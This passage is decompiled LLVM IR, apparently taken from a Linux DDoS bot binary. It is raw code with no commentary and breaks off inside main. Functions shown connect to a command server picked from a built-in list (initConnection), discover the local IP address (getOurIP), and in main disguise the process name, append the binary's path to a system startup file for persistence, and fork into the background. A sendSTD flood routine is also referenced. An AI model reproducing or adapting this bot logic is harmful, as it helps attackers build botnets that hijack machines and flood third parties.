  uselistorder i32 %v1_804c650, { 0, 3, 1, 2 }
  uselistorder i32 %v1_804c63e, { 1, 0 }
  uselistorder i32 %v1_804c639, { 0, 3, 1, 2 }
  uselistorder i1 %v0_804c5b1, { 1, 0 }
  uselistorder i32 %v1_804c539, { 1, 0 }
  uselistorder i1 %v0_804c447, { 1, 0 }
  uselistorder i1 %v0_804c3a2, { 1, 0 }
  uselistorder i1 %v0_804c317, { 1, 0 }
  uselistorder i1 %v0_804c2c9, { 1, 0 }
  uselistorder i1 %v0_804c268, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %tmp119, { 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 12, 13, 14, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i1* %cf.global-to-local, { 110, 111, 0, 112, 113, 114, 115, 1, 104, 2, 4, 3, 105, 5, 6, 7, 8, 9, 10, 11, 12, 13, 106, 14, 16, 15, 107, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 73, 41, 43, 42, 108, 44, 45, 46, 47, 48, 49, 109, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 98, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 99, 100, 101, 102, 103 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_8056a71.105 to i32), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* inttoptr (i32 -25 to i32*), { 1, 0, 2, 3, 4 }
  uselistorder i32* %arg2, { 2, 3, 4, 5, 1, 6, 7, 0, 8, 9, 10, 11, 14, 13, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 %arg1, { 9, 16, 0, 15, 8, 7, 14, 6, 13, 2, 5, 1, 12, 4, 11, 3, 10 }
  uselistorder label %dec_label_pc_804cd9b, { 1, 5, 6, 12, 13, 7, 0, 2, 14, 8, 3, 9, 4, 15, 10, 11, 16 }
  uselistorder label %dec_label_pc_804cd3e, { 1, 0 }
  uselistorder label %dec_label_pc_804cd3b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cc0b, { 1, 0 }
  uselistorder label %dec_label_pc_804cb91, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804cb18, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804ca65, { 1, 0 }
  uselistorder label %dec_label_pc_804ca29, { 1, 0 }
  uselistorder label %dec_label_pc_804c9f8, { 1, 0 }
  uselistorder label %dec_label_pc_804c967, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_804c94d, { 1, 0 }
  uselistorder label %dec_label_pc_804c7c2, { 1, 0 }
  uselistorder label %dec_label_pc_804c786, { 1, 0 }
  uselistorder label %dec_label_pc_804c755, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c68b, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804c57d, { 1, 0 }
  uselistorder label %dec_label_pc_804c36b, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cda6 = load i32, i32* @ebp, align 4
  store i32 %v0_804cda6, i32* %stack_var_-4, align 4
  %v4_804cda6 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cda6, i32* @ebp, align 4
  %v2_804cdaf = ptrtoint i32* %stack_var_-4104 to i32
  %v3_804cdcb = bitcast i32* %stack_var_-4104 to i8*
  %v4_804cdcb = call i32 @__GI_memset(i8* %v3_804cdcb, i32 0, i32 4096)
  %v0_804cdd0 = load i32, i32* @global_var_805a080.18, align 128
  %v1_804cdd5 = icmp eq i32 %v0_804cdd0, 0
  br i1 %v1_804cdd5, label %dec_label_pc_804cdf0, label %dec_label_pc_804cdd9

dec_label_pc_804cdd9:                             ; preds = %entry
  %v1_804cde1 = call i32 @__libc_close(i32 %v0_804cdd0)
  store i32 0, i32* @global_var_805a080.18, align 128
  br label %dec_label_pc_804cdf0

dec_label_pc_804cdf0:                             ; preds = %entry, %dec_label_pc_804cdd9
  %v0_804cdf0 = load i32, i32* @global_var_8059d18.127, align 8
  %v1_804cdf5 = icmp eq i32 %v0_804cdf0, 0
  %v1_804cdf7 = icmp eq i1 %v1_804cdf5, false
  br i1 %v1_804cdf7, label %dec_label_pc_804ce05, label %dec_label_pc_804ce10

dec_label_pc_804ce05:                             ; preds = %dec_label_pc_804cdf0
  %v1_804ce0a = add i32 %v0_804cdf0, 1
  br label %dec_label_pc_804ce10

dec_label_pc_804ce10:                             ; preds = %dec_label_pc_804cdf0, %dec_label_pc_804ce05
  %storemerge = phi i32 [ %v1_804ce0a, %dec_label_pc_804ce05 ], [ 0, %dec_label_pc_804cdf0 ]
  store i32 %storemerge, i32* @global_var_8059d18.127, align 8
  %v1_804ce15 = mul i32 %storemerge, 4
  %v2_804ce15 = add i32 %v1_804ce15, ptrtoint ([20 x i8]** @global_var_8059790.129 to i32)
  %v3_804ce15 = inttoptr i32 %v2_804ce15 to i32*
  %v4_804ce15 = load i32, i32* %v3_804ce15, align 4
  store i32 %v4_804ce15, i32* @eax, align 4
  %v3_804ce29 = call i32 @strcpy(i8* %v3_804cdcb, i32 %v4_804ce15)
  %v3_804ce46 = call i32 @__GI_strchr(i8* %v3_804cdcb, i32 58)
  %v1_804ce4b = icmp eq i32 %v3_804ce46, 0
  br i1 %v1_804ce4b, label %dec_label_pc_804ce8a, label %dec_label_pc_804ce4f

dec_label_pc_804ce4f:                             ; preds = %dec_label_pc_804ce10
  %v3_804ce60 = call i32 @__GI_strchr(i8* %v3_804cdcb, i32 58)
  %v1_804ce65 = add i32 %v3_804ce60, 1
  %v1_804ce69 = call i32 @atol(i32 %v1_804ce65)
  %v3_804ce82 = call i32 @__GI_strchr(i8* %v3_804cdcb, i32 58)
  %v4_804ce82 = inttoptr i32 %v3_804ce82 to i8*
  store i8 0, i8* %v4_804ce82, align 1
  br label %dec_label_pc_804ce8a

dec_label_pc_804ce8a:                             ; preds = %dec_label_pc_804ce10, %dec_label_pc_804ce4f
  %stack_var_-8.0 = phi i32 [ 123, %dec_label_pc_804ce10 ], [ %v1_804ce69, %dec_label_pc_804ce4f ]
  %v3_804cea1 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_804cea1, i32* @global_var_805a080.18, align 128
  %v4_804cecd = call i32 @connectTimeout(i32 %v3_804cea1, i32 %v2_804cdaf, i32 %stack_var_-8.0, i32 30)
  %v1_804ced2 = icmp eq i32 %v4_804cecd, 0
  %. = zext i1 %v1_804ced2 to i32
  %v2_804cef2 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cef2, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 (i32)* @atol, { 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ce8a, { 1, 0 }
  uselistorder label %dec_label_pc_804ce10, { 1, 0 }
  uselistorder label %dec_label_pc_804cdf0, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804cef4 = load i32, i32* @ebp, align 4
  store i32 %v0_804cef4, i32* %stack_var_-4, align 4
  %v5_804cf14 = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_804cf1c = icmp eq i32 %v5_804cf14, -1
  %v1_804cf20 = icmp eq i1 %v13_804cf1c, false
  br i1 %v1_804cf20, label %dec_label_pc_804cf31, label %dec_label_pc_804d10f

dec_label_pc_804cf31:                             ; preds = %entry
  %v2_804cf31 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_804cf5c = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_8056c42.130 to i32))
  %v3_804cf6b = call i32 @htons(i16 53)
  %v5_804cf8c = call i32 @__libc_connect(i32 %v5_804cf14, i32 %v2_804cf31, i32 16)
  %v13_804cf94 = icmp eq i32 %v5_804cf8c, -1
  %v1_804cf98 = icmp eq i1 %v13_804cf94, false
  br i1 %v1_804cf98, label %dec_label_pc_804cfa9, label %dec_label_pc_804d10f

dec_label_pc_804cfa9:                             ; preds = %dec_label_pc_804cf31
  store i32 16, i32* %stack_var_-60, align 4
  %v2_804cfb0 = ptrtoint i32* %stack_var_-56 to i32
  %v2_804cfb3 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804cfc4 = call i32 @__GI_getsockname(i32 %v5_804cf14, i32 %v2_804cfb0, i32 %v2_804cfb3)
  %v13_804cfcc = icmp eq i32 %v5_804cfc4, -1
  %v1_804cfd0 = icmp eq i1 %v13_804cfcc, false
  br i1 %v1_804cfd0, label %dec_label_pc_804cfe1, label %dec_label_pc_804d10f

dec_label_pc_804cfe1:                             ; preds = %dec_label_pc_804cfa9
  %v5_804cff8 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_8056c4a.131, i32 0, i32 0), i32 0)
  %v2_804d05d = ptrtoint i8* %stack_var_-4156 to i32
  %v5_804d07534 = call i32 @fdgets(i32 %v2_804d05d, i32 4096, i32 %v5_804cff8)
  %v1_804d07a35 = icmp eq i32 %v5_804d07534, 0
  %v1_804d07c37 = icmp eq i1 %v1_804d07a35, false
  br i1 %v1_804d07c37, label %dec_label_pc_804d002, label %dec_label_pc_804d07e

dec_label_pc_804d002:                             ; preds = %dec_label_pc_804cfe1, %dec_label_pc_804d03c
  %v5_804d013 = call i32 @strstr(i32 %v2_804d05d, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_8056c5a.132, i32 0, i32 0))
  %v1_804d018 = icmp eq i32 %v5_804d013, 0
  br i1 %v1_804d018, label %dec_label_pc_804d03c, label %dec_label_pc_804d02a

dec_label_pc_804d027:                             ; preds = %dec_label_pc_804d02a
  %v4_804d02a = ptrtoint i8* %storemerge5 to i32
  %v5_804d027 = add i32 %v4_804d02a, 1
  %v22_804d027 = inttoptr i32 %v5_804d027 to i8*
  br label %dec_label_pc_804d02a

dec_label_pc_804d02a:                             ; preds = %dec_label_pc_804d002, %dec_label_pc_804d027
  %storemerge5 = phi i8* [ %v22_804d027, %dec_label_pc_804d027 ], [ %stack_var_-4156, %dec_label_pc_804d002 ]
  %v2_804d02d = load i8, i8* %storemerge5, align 1
  %v10_804d030 = icmp eq i8 %v2_804d02d, 9
  %v1_804d032 = icmp eq i1 %v10_804d030, false
  br i1 %v1_804d032, label %dec_label_pc_804d027, label %dec_label_pc_804d034

dec_label_pc_804d034:                             ; preds = %dec_label_pc_804d02a
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_804d07e

dec_label_pc_804d03c:                             ; preds = %dec_label_pc_804d002
  %v6_804d058 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804d075 = call i32 @fdgets(i32 %v2_804d05d, i32 4096, i32 %v5_804cff8)
  %v1_804d07a = icmp eq i32 %v5_804d075, 0
  %v1_804d07c = icmp eq i1 %v1_804d07a, false
  br i1 %v1_804d07c, label %dec_label_pc_804d002, label %dec_label_pc_804d07e

dec_label_pc_804d07e:                             ; preds = %dec_label_pc_804cfe1, %dec_label_pc_804d03c, %dec_label_pc_804d034
  %v2_804d084 = call i32 @__libc_close(i32 %v5_804cff8)
  %v3_804d089 = load i8, i8* %stack_var_-4156, align 1
  %v4_804d090 = icmp eq i8 %v3_804d089, 0
  br i1 %v4_804d090, label %dec_label_pc_804d0f6, label %dec_label_pc_804d094

dec_label_pc_804d094:                             ; preds = %dec_label_pc_804d07e
  %v2_804d09e = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804d09e, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804d0a7 = call i32 @strcpy(i8* %tmp32, i32 %v2_804d05d)
  %v5_804d0c4 = call i32 @ioctl(i32 %v5_804cf14, i32 35111, i32 %v2_804d09e)
  %v2_804d0db = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804d0d2

dec_label_pc_804d0d2:                             ; preds = %dec_label_pc_804d094, %dec_label_pc_804d0d2
  %storemerge33 = phi i32 [ 0, %dec_label_pc_804d094 ], [ %v4_804d0ed, %dec_label_pc_804d0d2 ]
  %v2_804d0e1 = add i32 %storemerge33, %v2_804d0db
  %v1_804d0e4 = inttoptr i32 %v2_804d0e1 to i8*
  %v2_804d0e4 = load i8, i8* %v1_804d0e4, align 1
  %v3_804d0e7 = add i32 %storemerge33, ptrtoint (i8** @global_var_805a090.133 to i32)
  %v4_804d0e7 = inttoptr i32 %v3_804d0e7 to i8*
  store i8 %v2_804d0e4, i8* %v4_804d0e7, align 1
  %v4_804d0ed = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_804d0ed, 6
  br i1 %exitcond, label %dec_label_pc_804d0f6, label %dec_label_pc_804d0d2

dec_label_pc_804d0f6:                             ; preds = %dec_label_pc_804d0d2, %dec_label_pc_804d07e
  %v2_804d0fc = call i32 @__libc_close(i32 %v5_804cf14)
  br label %dec_label_pc_804d10f

dec_label_pc_804d10f:                             ; preds = %entry, %dec_label_pc_804cf31, %dec_label_pc_804cfa9, %dec_label_pc_804d0f6
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_804d0f6 ], [ 0, %dec_label_pc_804cfa9 ], [ 0, %dec_label_pc_804cf31 ], [ 0, %entry ]
  %v2_804d115 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d115, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_804d05d, { 1, 3, 2, 0 }
  uselistorder i32 %v5_804cff8, { 1, 2, 0 }
  uselistorder i32 %v5_804cf14, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 8, 1, 2, 3, 4, 5, 6, 0, 7, 9, 10, 11 }
  uselistorder label %dec_label_pc_804d10f, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804d07e, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804d02a, { 1, 0 }
  uselistorder label %dec_label_pc_804d002, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([7 x i8]* @global_var_8056c65.134 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804d121 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804d121, i32* %stack_var_-24, align 4
  %v5_804d132 = icmp ult i32* %stack_var_-24, inttoptr (i32 5864 to i32*)
  store i1 %v5_804d132, i1* %cf.global-to-local, align 1
  %v1_804d14b = add i32 %v2_804d121, 4
  %v2_804d14b = inttoptr i32 %v1_804d14b to i32*
  %v3_804d14b = load i32, i32* %v2_804d14b, align 4
  %v1_804d14e = inttoptr i32 %v3_804d14b to i32*
  %v2_804d14e = load i32, i32* %v1_804d14e, align 4
  store i1 false, i1* @df, align 1
  %v4_804d15e = inttoptr i32 %v2_804d14e to i8*
  store i32 %v2_804d14e, i32* @edi, align 4
  %v3_804d164 = call i32 @_strlen(i8* %v4_804d15e)
  %v3_804d173 = load i32, i32* %v2_804d14b, align 4
  %v1_804d176 = inttoptr i32 %v3_804d173 to i32*
  %v2_804d176 = load i32, i32* %v1_804d176, align 4
  store i32 %v2_804d176, i32* %stack_var_-5888, align 4
  %v4_804d187 = inttoptr i32 %v2_804d176 to i8*
  %v5_804d187 = call i32 @strncpy(i8* %v4_804d187, i32 ptrtoint (i32* @global_var_8056c6c.135 to i32), i32 %v3_804d164)
  store i32 %v2_804d121, i32* @esi, align 4
  %v3_804d197 = load i32, i32* %v2_804d14b, align 4
  %v2_804d19a = inttoptr i32 %v3_804d197 to i32*
  store i32 ptrtoint (i32* @global_var_8056c6c.135 to i32), i32* %v2_804d19a, align 4
  store i32 15, i32* %stack_var_-5888, align 4
  %v6_804d1c2 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_8056c6c.135 to i32), i32 0, i32 0, i32 0)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804d1ce = call i32 @__GI_time(i32* null)
  store i32 %v2_804d1ce, i32* @ebx, align 4
  %v0_804d1d5 = call i32 @__libc_getpid()
  %v1_804d1da = load i32, i32* @ebx, align 4
  %v2_804d1da = xor i32 %v1_804d1da, %v0_804d1d5
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d1da, i32* @eax, align 4
  store i32 %v2_804d1da, i32* %stack_var_-5888, align 4
  %v1_804d1df = call i32 @srand(i32 %v2_804d1da)
  store i32 0, i32* %stack_var_-5888, align 4
  %v2_804d1eb = call i32 @__GI_time(i32* null)
  store i32 %v2_804d1eb, i32* @ebx, align 4
  %v0_804d1f2 = call i32 @__libc_getpid()
  %v1_804d1f7 = load i32, i32* @ebx, align 4
  %v2_804d1f7 = xor i32 %v1_804d1f7, %v0_804d1f2
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804d1f7, i32* %stack_var_-5888, align 4
  %v1_804d1fc = call i32 @init_rand(i32 %v2_804d1f7)
  store i32 ptrtoint ([19 x i8]* @global_var_8056c6d.136 to i32), i32* @eax, align 4
  store i32 ptrtoint ([19 x i8]* @global_var_8056c6d.136 to i32), i32* %stack_var_-5888, align 4
  %v3_804d21d = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8056c6d.136 to i32), i32 ptrtoint ([2 x i8]* @global_var_8056c80.137 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d225 = icmp eq i32 %v3_804d21d, 0
  %v1_804d229 = icmp eq i1 %v4_804d225, false
  br i1 %v1_804d229, label %dec_label_pc_804d248, label %dec_label_pc_804d22b

dec_label_pc_804d22b:                             ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_8056c82.138 to i32), i32* @eax, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_8056c82.138 to i32), i32* %stack_var_-5888, align 4
  %v3_804d240 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_8056c82.138 to i32), i32 ptrtoint ([2 x i8]* @global_var_8056c80.137 to i32))
  br label %dec_label_pc_804d248

dec_label_pc_804d248:                             ; preds = %entry, %dec_label_pc_804d22b
  %stack_var_-88.0 = phi i32 [ %v3_804d21d, %entry ], [ %v3_804d240, %dec_label_pc_804d22b ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_8056c6d.136, i32 0, i32 0), %entry ], [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8056c82.138, i32 0, i32 0), %dec_label_pc_804d22b ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d248 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804d248, label %dec_label_pc_804d3ea, label %dec_label_pc_804d252

dec_label_pc_804d252:                             ; preds = %dec_label_pc_804d248
  %v3_804d258 = load i32, i32* %v2_804d14b, align 4
  %v1_804d25b = inttoptr i32 %v3_804d258 to i32*
  %v2_804d25b = load i32, i32* %v1_804d25b, align 4
  store i1 false, i1* @df, align 1
  %v4_804d26b = inttoptr i32 %v2_804d25b to i8*
  store i32 %v2_804d25b, i32* @edi, align 4
  %v3_804d271 = call i32 @_strlen(i8* %v4_804d26b)
  %v2_804d28a = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804d28a, i32* %stack_var_-5888, align 4
  %v3_804d293 = call i32 @getcwd(i32 %v2_804d28a, i32 256)
  store i1 false, i1* @df, align 1
  %v4_804d2b9 = bitcast i32* %stack_var_-368 to i8*
  store i32 %v2_804d28a, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8056c8f.139 to i32), i32* @edi, align 4
  %v7_804d2cb = call i32 @_strncmp(i8* %v4_804d2b9, i8* bitcast (i8** @global_var_8056c8f.139 to i8*), i32 2)
  %v8_804d2cb = urem i32 %v7_804d2cb, 2
  %v9_804d2cb = icmp eq i32 %v8_804d2cb, 0
  %v0_804d2cd = load i1, i1* @cf, align 1
  %v2_804d2cd = or i1 %v0_804d2cd, %v9_804d2cb
  %v3_804d2cd = zext i1 %v2_804d2cd to i8
  %v7_804d2cd = xor i8 %v3_804d2cd, 1
  %v5_804d2d0 = ptrtoint i32* %stack_var_-512 to i32
  %v3_804d2d3 = and i32 %v7_804d2cb, -256
  %v3_804d2d5 = trunc i32 %v5_804d2d0 to i8
  %v4_804d2d5 = sub i8 %v7_804d2cd, %v3_804d2d5
  %v15_804d2d5 = icmp eq i8 %v4_804d2d5, 0
  %v20_804d2d5 = zext i8 %v4_804d2d5 to i32
  %v23_804d2d5 = or i32 %v20_804d2d5, %v3_804d2d3
  store i32 %v23_804d2d5, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804d2d5, label %dec_label_pc_804d3df, label %dec_label_pc_804d2e9

dec_label_pc_804d2e6:                             ; preds = %dec_label_pc_804d2e9
  %v4_804d2e6 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804d2e9

dec_label_pc_804d2e9:                             ; preds = %dec_label_pc_804d252, %dec_label_pc_804d2e6
  %stack_var_-84.0 = phi i32 [ %v4_804d2e6, %dec_label_pc_804d2e6 ], [ %v3_804d271, %dec_label_pc_804d252 ]
  store i32 %v2_804d121, i32* @esi, align 4
  %v3_804d2ef = load i32, i32* %v2_804d14b, align 4
  %v1_804d2f2 = inttoptr i32 %v3_804d2ef to i32*
  %v2_804d2f2 = load i32, i32* %v1_804d2f2, align 4
  %v2_804d2f7 = add i32 %v2_804d2f2, %stack_var_-84.0
  %v1_804d2fa = inttoptr i32 %v2_804d2f7 to i8*
  %v2_804d2fa = load i8, i8* %v1_804d2fa, align 1
  %v6_804d2fd = icmp ult i8 %v2_804d2fa, 47
  store i1 %v6_804d2fd, i1* %cf.global-to-local, align 1
  %v10_804d2fd = icmp eq i8 %v2_804d2fa, 47
  %v1_804d2ff = icmp eq i1 %v10_804d2fd, false
  br i1 %v1_804d2ff, label %dec_label_pc_804d2e6, label %dec_label_pc_804d301

dec_label_pc_804d301:                             ; preds = %dec_label_pc_804d2e9
  store i32 %v2_804d121, i32* @edi, align 4
  %v3_804d307 = load i32, i32* %v2_804d14b, align 4
  %v1_804d30a = inttoptr i32 %v3_804d307 to i32*
  %v2_804d30a = load i32, i32* %v1_804d30a, align 4
  %v2_804d30f = add i32 %v2_804d30a, %stack_var_-84.0
  %v2_804d328 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804d328, i32* %stack_var_-5888, align 4
  %v5_804d331 = call i32 @sprintf(i32 %v2_804d328, i32 ptrtoint ([8 x i8]* @global_var_8056c91.140 to i32), i32 %v2_804d28a, i32 %v2_804d30f)
  %v1_804d37a = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804d347 = ptrtoint i32* %stack_var_-1648 to i32
  %v3_804d368 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_804d374.outer

dec_label_pc_804d338:                             ; preds = %dec_label_pc_804d374
  store i32 %v2_804d347, i32* %stack_var_-5888, align 4
  %v4_804d350 = call i32 @fgets(i32 %v2_804d347, i32 1024, i32 %stack_var_-88.0)
  store i32 %v2_804d347, i32* %stack_var_-5888, align 4
  %v4_804d368 = call i32 @__GI_strcasecmp(i8* %v3_804d368, i32 %v2_804d328)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d36d = icmp eq i32 %v4_804d368, 0
  %v1_804d36f = icmp eq i1 %v1_804d36d, false
  br i1 %v1_804d36f, label %dec_label_pc_804d374, label %dec_label_pc_804d371

dec_label_pc_804d371:                             ; preds = %dec_label_pc_804d338
  %v4_804d371 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804d374.outer

dec_label_pc_804d374.outer:                       ; preds = %dec_label_pc_804d371, %dec_label_pc_804d301
  %stack_var_-80.0.ph = phi i32 [ %v4_804d371, %dec_label_pc_804d371 ], [ 0, %dec_label_pc_804d301 ]
  br label %dec_label_pc_804d374

dec_label_pc_804d374:                             ; preds = %dec_label_pc_804d374.outer, %dec_label_pc_804d338
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804d37a = call i32 @feof(i16* %v1_804d37a)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d37f = icmp eq i32 %v2_804d37a, 0
  br i1 %v1_804d37f, label %dec_label_pc_804d338, label %dec_label_pc_804d383

dec_label_pc_804d383:                             ; preds = %dec_label_pc_804d374
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d383 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804d387 = icmp eq i1 %v4_804d383, false
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v2_804d3d8 = call i32 @__GI_fclose(i16* %v1_804d37a)
  br i1 %v1_804d387, label %dec_label_pc_804d3ea, label %dec_label_pc_804d389

dec_label_pc_804d389:                             ; preds = %dec_label_pc_804d383
  %v4_804d39c = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_804d39c, i32* @eax, align 4
  store i32 %v4_804d39c, i32* %stack_var_-5888, align 4
  %v3_804d3a2 = call i32 @__GI_fopen(i32 %v4_804d39c, i32 ptrtoint (i32* @global_var_8056c99.141 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d3aa = icmp eq i32 %v3_804d3a2, 0
  br i1 %v4_804d3aa, label %dec_label_pc_804d3ea, label %dec_label_pc_804d3b0

dec_label_pc_804d3b0:                             ; preds = %dec_label_pc_804d389
  store i32 %v2_804d328, i32* %stack_var_-5888, align 4
  %v3_804d3c0 = call i32 @__GI_fputs(i32 %v2_804d328, i32 %v3_804d3a2)
  store i32 %v3_804d3a2, i32* @eax, align 4
  store i32 %v3_804d3a2, i32* %stack_var_-5888, align 4
  %v1_804d3cb = inttoptr i32 %v3_804d3a2 to i16*
  %v2_804d3cb = call i32 @__GI_fclose(i16* %v1_804d3cb)
  br label %dec_label_pc_804d3ea

dec_label_pc_804d3df:                             ; preds = %dec_label_pc_804d252
  store i32 %stack_var_-88.0, i32* @eax, align 4
  store i32 %stack_var_-88.0, i32* %stack_var_-5888, align 4
  %v1_804d3e5 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_804d3e5 = call i32 @__GI_fclose(i16* %v1_804d3e5)
  br label %dec_label_pc_804d3ea

dec_label_pc_804d3ea:                             ; preds = %dec_label_pc_804d383, %dec_label_pc_804d389, %dec_label_pc_804d248, %dec_label_pc_804d3b0, %dec_label_pc_804d3df
  %v0_804d3ea = call i32 @getOurIP()
  %v0_804d3ef = load i32, i32* %stack_var_-5888, align 4
  %v1_804d3ef = call i32 @__libc_fork(i32 %v0_804d3ef)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d3f7 = icmp eq i32 %v1_804d3ef, 0
  br i1 %v4_804d3f7, label %dec_label_pc_804d429, label %dec_label_pc_804d458

dec_label_pc_804d429:                             ; preds = %dec_label_pc_804d3ea
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804d429 = load i32, i32* %stack_var_-5888, align 4
  %v1_804d429 = call i32 @__libc_fork(i32 %v0_804d429)
  store i32 %v1_804d429, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d431 = icmp eq i32 %v1_804d429, 0
  br i1 %v4_804d431, label %dec_label_pc_804d443.thread, label %dec_label_pc_804d449

dec_label_pc_804d443.thread:                      ; preds = %dec_label_pc_804d429
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d465

dec_label_pc_804d449:                             ; preds = %dec_label_pc_804d429
  store i32 0, i32* %stack_var_-5888, align 4
  %v1_804d43e = call i32 @__GI_exit(i32 0)
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8056c9b.142 to i32), i32* %stack_var_-5888, align 4
